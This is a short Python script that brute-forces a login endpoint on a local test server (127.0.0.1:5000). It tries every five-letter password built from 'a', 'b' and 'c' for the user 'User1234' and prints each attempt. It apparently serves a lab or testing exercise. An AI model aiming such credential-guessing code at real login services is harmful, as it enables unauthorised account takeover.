import requests
import itertools

# URL of the login endpoint
url = "http://127.0.0.1:5000/login"

# Generate all combinations of 'a', 'b', 'c' with length 5
combinations = itertools.product('abc', repeat=5)

def brute_force_login(url, username, combinations):
    for combination in combinations:
        password = ''.join(combination)
        response = requests.post(url, json={"username": username, "password": password})
        if response.status_code == 200:
            print(f"Success! Username: {username}, Password: {password}")
            return
        else:
            print(f"Failed attempt. Username: {username}, Password: {password}, Response: {response.json()}")

    print("Brute force attack completed. No valid credentials found.")

username = "User1234"
brute_force_login(url, username, combinations)
